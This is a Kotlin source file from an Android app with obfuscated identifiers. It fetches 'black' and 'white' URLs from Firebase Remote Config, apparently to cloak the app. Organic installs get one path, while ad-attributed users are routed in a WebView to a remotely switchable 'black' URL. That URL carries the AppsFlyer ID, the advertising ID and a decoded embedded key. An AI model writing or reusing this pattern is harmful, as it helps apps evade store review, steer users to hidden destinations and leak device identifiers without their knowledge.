package com.soon.pamatch.co.com

import android.net.Uri
import android.widget.Button
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.soon.pamatch.co.com.WebView9gyn0.WebView9gyn0

fun MainActivity9gyn0.getAndSaveURL9gyn0() {
    if (fbBlackValue9gyn0 == null || fbBlackValue9gyn0 == EMPTY_TAG_9gyn0) {
        get9gyn0Preferences().putURL9gyn0(fbWhiteValue9gyn0 ?: return)
    } else {
        if (status9gyn0 == NON_ORGANIC_TAG_9gyn0) {
            if (key9gyn0.toString().length != 20) {
                get9gyn0Preferences().putURL9gyn0(
                    Uri.parse(fbBlackValue9gyn0).buildUpon()
                        .appendQueryParameter(KEY_TAG_9gyn0, fbDefaultValue9gyn0)
                        .appendQueryParameter(BUNDLE_TAG_9gyn0, packageName)
                        .appendQueryParameter(SUB4_TAG_9gyn0, adGroup9gyn0)
                        .appendQueryParameter(SUB5_TAG_9gyn0, adSet29gyn0)
                        .appendQueryParameter(SUB6_TAG_9gyn0, afChannel9gyn0)
                        .appendQueryParameter(SUB7_TAG_9gyn0, DEFAULT_TAG_9gyn0)
                        .toString()
                        .plus(
                            "&$SUB10_TAG_9gyn0=$APPSFLYER_UID9gyn0||$AID9gyn0||${
                                decodeBase649gyn0(
                                    BuildConfig.APPS_KEY_9gyn0
                                )
                            }"
                        )
                )
            } else {
                get9gyn0Preferences().putURL9gyn0(
                    Uri.parse(fbBlackValue9gyn0).buildUpon()
                        .appendQueryParameter(KEY_TAG_9gyn0, key9gyn0)
                        .appendQueryParameter(BUNDLE_TAG_9gyn0, packageName)
                        .appendQueryParameter(SUB2_TAG_9gyn0, sub29gyn0)
                        .appendQueryParameter(SUB3_TAG_9gyn0, sub39gyn0)
                        .appendQueryParameter(SUB4_TAG_9gyn0, adGroup9gyn0)
                        .appendQueryParameter(SUB5_TAG_9gyn0, adSet29gyn0)
                        .appendQueryParameter(SUB6_TAG_9gyn0, afChannel9gyn0)
                        .appendQueryParameter(SUB7_TAG_9gyn0, mediaSource9gyn0)
                        .toString()
                        .plus(
                            "&$SUB10_TAG_9gyn0=$APPSFLYER_UID9gyn0||$AID9gyn0||${
                                decodeBase649gyn0(
                                    BuildConfig.APPS_KEY_9gyn0
                                )
                            }"
                        )
                )
            }
        } else {
            get9gyn0Preferences().putURL9gyn0(
                Uri.parse(fbBlackValue9gyn0).buildUpon()
                    .appendQueryParameter(KEY_TAG_9gyn0, fbDefaultValue9gyn0)
                    .appendQueryParameter(SUB7_TAG_9gyn0, ORGANIC_TAG_9gyn0)
                    .toString()
                    .plus(
                        "&$SUB10_TAG_9gyn0=$APPSFLYER_UID9gyn0||$AID9gyn0||${
                            decodeBase649gyn0(
                                BuildConfig.APPS_KEY_9gyn0
                            )
                        }"
                    )
            )
        }
    }
}

fun MainActivity9gyn0.setupFirebase9gyn0() {
    Firebase.remoteConfig.run {
        setConfigSettingsAsync(
            remoteConfigSettings {
                minimumFetchIntervalInSeconds = 1000
            })
        setDefaultsAsync(
            mapOf(
                FB_BLACK_KEY_9gyn0 to EMPTY_TAG_9gyn0
            )
        )
        fetchAndActivate().addOnCompleteListener {
            if (it.isSuccessful) {
                fbBlackValue9gyn0 = getString(FB_BLACK_KEY_9gyn0)
                fbDefaultValue9gyn0 = getString(FB_DEFAULT_KEY_9gyn0)
                fbWhiteValue9gyn0 = getString(FB_WHITE_KEY_9gyn0)
            }
        }
    }
}

fun MainActivity9gyn0.clickStart9gyn0(buttonClick: () -> Unit) {
    findViewById<Button>(R.id.b_9gyn0).setOnClickListener {
        buttonClick()
    }
}

fun WebActivity9gyn0.onRefresh9gyn0(refresh: (srl: SwipeRefreshLayout) -> Unit) {
    findViewById<SwipeRefreshLayout>(R.id.srl_9gyn0).run {
        setOnRefreshListener {
            refresh(this)
        }
    }
}

fun WebActivity9gyn0.setChrome9gyn0() {
    findViewById<WebView9gyn0>(R.id.wv_9gyn0).run {
        setWebChromeClient(this@setChrome9gyn0)
    }
}